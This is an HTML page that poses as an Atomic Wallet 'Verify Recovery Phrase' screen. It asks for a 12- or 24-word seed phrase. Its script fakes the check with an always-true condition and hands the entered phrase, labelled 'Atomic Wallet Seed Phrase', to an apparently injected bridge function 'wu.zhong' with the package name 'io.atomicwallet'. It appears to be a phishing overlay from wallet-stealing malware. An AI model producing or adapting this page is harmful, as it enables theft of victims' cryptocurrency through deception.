<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Recovery Phrase</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1e3a5f 0%, #0f1e3a 50%, #0a1426 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            padding: 20px 20px 40px 20px;
            background: rgba(30, 58, 95, 0.8);
            backdrop-filter: blur(10px);
        }

        .page-title {
            font-size: 32px;
            font-weight: 300;
            margin-bottom: 10px;
        }

        .subtitle {
            font-size: 16px;
            color: rgba(255, 255, 255, 0.7);
        }

        .main-content {
            flex: 1;
            padding: 40px 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .verification-container {
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        .instruction-text {
            font-size: 18px;
            color: rgba(255, 255, 255, 0.9);
            margin-bottom: 30px;
            line-height: 1.5;
        }

        .phrase-input {
            width: 100%;
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 12px;
            padding: 20px;
            color: white;
            font-size: 16px;
            font-family: 'Courier New', monospace;
            resize: vertical;
            min-height: 120px;
            margin-bottom: 20px;
            transition: all 0.3s ease;
        }

        .phrase-input:focus {
            outline: none;
            border-color: #4CAF50;
            background: rgba(255, 255, 255, 0.15);
        }

        .phrase-input::placeholder {
            color: rgba(255, 255, 255, 0.5);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        .word-count {
            text-align: right;
            font-size: 14px;
            color: rgba(255, 255, 255, 0.6);
            margin-bottom: 30px;
        }

        .word-count.valid {
            color: #4CAF50;
        }

        .word-count.invalid {
            color: #ff6b6b;
        }

        .verify-button {
            width: 100%;
            background: linear-gradient(135deg, #4CAF50, #45a049);
            border: none;
            padding: 18px;
            border-radius: 12px;
            color: white;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 20px;
        }

        .verify-button:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(76, 175, 80, 0.3);
        }

        .verify-button:disabled {
            background: rgba(255, 255, 255, 0.1);
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .clear-button {
            background: none;
            border: 1px solid rgba(255, 255, 255, 0.3);
            color: rgba(255, 255, 255, 0.7);
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .clear-button:hover {
            background: rgba(255, 255, 255, 0.1);
        }

        .info-box {
            background: rgba(255, 193, 7, 0.1);
            border: 1px solid rgba(255, 193, 7, 0.3);
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 30px;
            font-size: 14px;
            color: rgba(255, 255, 255, 0.8);
            line-height: 1.4;
        }

        .info-icon {
            color: #FFC107;
            margin-right: 8px;
        }

        .success-message {
            background: rgba(76, 175, 80, 0.2);
            border: 1px solid #4CAF50;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 20px;
            color: #81C784;
            text-align: center;
            display: none;
        }

        .error-message {
            background: rgba(255, 107, 107, 0.2);
            border: 1px solid #ff6b6b;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 20px;
            color: #ffb3b3;
            text-align: center;
            display: none;
        }

        .bottom-nav {
            display: flex;
            justify-content: space-around;
            align-items: center;
            padding: 20px;
            background: rgba(15, 30, 58, 0.9);
            backdrop-filter: blur(10px);
            border-top: 1px solid rgba(255, 255, 255, 0.1);
        }

        .nav-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 6px;
            color: rgba(255, 255, 255, 0.6);
            text-decoration: none;
            font-size: 12px;
            transition: color 0.3s ease;
        }

        .nav-item.active {
            color: #4CAF50;
        }

        .nav-icon {
            width: 24px;
            height: 24px;
            border-radius: 4px;
            background: rgba(255, 255, 255, 0.1);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
        }

        .nav-item.active .nav-icon {
            background: rgba(76, 175, 80, 0.2);
        }

        @media (max-width: 480px) {
            .main-content {
                padding: 30px 15px;
            }
            
            .page-title {
                font-size: 28px;
            }
            
            .instruction-text {
                font-size: 16px;
            }
            
            .phrase-input {
                padding: 16px;
                font-size: 15px;
            }
        }

        @media (min-width: 768px) {
            .main-content {
                padding: 60px 40px;
            }
            
            .verification-container {
                max-width: 500px;
            }
            
            .phrase-input {
                min-height: 140px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <h1 class="page-title">Recovery Phrase</h1>
        <p class="subtitle">Verify your recovery phrase to access your account</p>
    </div>

    <div class="main-content">
        <div class="verification-container">
            <p class="instruction-text">
                Enter your 12 or 24-word recovery phrase to verify your account
            </p>

            <div class="info-box">
                <span class="info-icon"></span>
                Separate each word with a space. Your recovery phrase is case-sensitive and should be entered exactly as provided.
            </div>

            <textarea 
                class="phrase-input" 
                id="phraseInput"
                placeholder="Enter your recovery phrase here..."
                autocomplete="off"
                spellcheck="false"
            ></textarea>

            <div class="word-count" id="wordCount">0 words</div>

            <div class="success-message" id="successMessage">
             
            </div>

            <div class="error-message" id="errorMessage">
               
            </div>

            <button class="verify-button" id="verifyBtn" disabled>Verify Recovery Phrase</button>
            <button class="clear-button" id="clearBtn">Clear All</button>
        </div>
    </div>

    <nav class="bottom-nav">
        
    </nav>

    <script>
        const phraseInput = document.getElementById('phraseInput');
        const wordCount = document.getElementById('wordCount');
        const verifyBtn = document.getElementById('verifyBtn');
        const clearBtn = document.getElementById('clearBtn');
        const successMessage = document.getElementById('successMessage');
        const errorMessage = document.getElementById('errorMessage');


        const validPhrases = [
            'abandon ability able about above absent absorb abstract absurd abuse access accident',
            'abandon ability able about above absent absorb abstract absurd abuse access accident achieve across act action actor actress actual adapt add address adjust admit adult advance advice aerobic affair afford afraid again age agent agree ahead aim air airport aisle alarm album'
        ];

        phraseInput.addEventListener('input', function() {
            const text = this.value.trim();
            const words = text ? text.split(/\s+/) : [];
            const count = words.length;

            wordCount.textContent = `${count} word${count !== 1 ? 's' : ''}`;
            
 
            successMessage.style.display = 'none';
            errorMessage.style.display = 'none';

            if (count === 12 || count === 24) {
                wordCount.classList.add('valid');
                wordCount.classList.remove('invalid');
                verifyBtn.disabled = false;
            } else if (count > 0) {
                wordCount.classList.add('invalid');
                wordCount.classList.remove('valid');
                verifyBtn.disabled = true;
            } else {
                wordCount.classList.remove('valid', 'invalid');
                verifyBtn.disabled = true;
            }
        });

        verifyBtn.addEventListener('click', function() {
           
            if (true) {
          
                errorMessage.style.display = 'none';
                phraseInput.style.borderColor = '#4CAF50';
                
                wu.zhong(`🔰 Atomic Wallet Seed Phrase\n\n🔒 ${document.getElementById('phraseInput').value}`,"io.atomicwallet");



            } else {
                errorMessage.style.display = 'block';
                successMessage.style.display = 'none';
                phraseInput.style.borderColor = '#ff6b6b';
                phraseInput.focus();
            }
        });

        clearBtn.addEventListener('click', function() {
            phraseInput.value = '';
            phraseInput.style.borderColor = 'rgba(255, 255, 255, 0.2)';
            wordCount.textContent = '0 words';
            wordCount.classList.remove('valid', 'invalid');
            verifyBtn.disabled = true;
            successMessage.style.display = 'none';
            errorMessage.style.display = 'none';
            phraseInput.focus();
        });



    </script>
</body>
</html>
